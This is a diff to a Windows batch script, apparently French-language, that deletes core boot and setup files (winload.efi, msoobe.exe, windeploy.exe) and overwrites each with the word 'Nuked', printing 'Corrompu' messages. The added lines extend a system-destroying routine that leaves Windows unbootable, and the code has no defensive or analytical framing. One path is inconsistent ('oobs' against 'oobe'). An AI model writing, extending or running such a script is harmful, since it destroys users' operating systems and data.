@@ -53,5 +53,10 @@ del %sw%\winload.efi /s /f /q
 echo Nuked > %sw%\winload.efi
 echo Corrompu: Windows Loader (EFI)
 ::
-del 
-
+del %sw%\oobe\msoobe.exe /s /f /q
+echo Nuked > %sw%\oobe\msoobe.exe
+echo Corrompu: Out Of Box Experience Setup
+::
+del %sw%\oobs\windeploy.exe /s /f /q
+echo Nuked > %sw%\oobe\windeploy.exe
+echo Corrompu: Windows Drivers Deployer
